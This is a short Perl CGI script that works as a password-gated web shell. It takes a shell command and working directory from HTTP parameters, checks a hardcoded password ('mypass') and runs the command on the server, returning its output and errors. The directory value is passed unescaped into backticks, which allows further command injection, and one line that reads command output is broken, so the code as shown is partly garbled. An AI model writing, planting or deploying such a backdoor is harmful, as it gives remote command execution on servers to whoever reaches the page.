#!/usr/bin/perl --

use CGI;
use IPC::Open3;
use IO::Select;
use strict;

print CGI::header( -type => 'text/plain' );

my $command = CGI::param('command');
my $pwd = CGI::param('pwd') || '';
my $password = CGI::param('password');

if ( $password ne 'mypass' ) {
    print "Please provide a valid password.\n";
    exit(0)
}

if ($command =~ /^cd\s+(.+)/) {
  eval {
    my $dir = $1;
    my $newDir;
    if ($dir =~ /\//) {
      $newDir = $dir;
    } else {
      $newDir = "$pwd/$1";
    }
    $pwd = `(cd $newDir;pwd)`;
    print "\n", "change_pwd=$pwd\n";
  };
} else {
    my $cmd = "(cd $pwd;$command)";
    open3(*scriptIN, *scriptOUT, *scriptERR, $cmd);
    my $selector = IO::Select->new();
    $selector->add(*scriptERR, *scriptOUT);
    while (my @ready = $selector->can_read) {
      if (scalar(@ready) == 0) {
        last;
      }
      foreach my $fh (@ready) {
        my $out;
        if (fileno($fh) == fileno(scriptERR)) {
          $out = scalar <scriptERR>;
          printf "ERR> %s", $out if $out;
        } else {
          $out = ;
          printf "%s", $out if $out;
        }
        $selector->remove($fh) if eof($fh);
      }
    }
    close(scriptOUT);
    close(scriptERR);
}

print "Error during command ($command) execution: $@" if ($@);

exit(0);
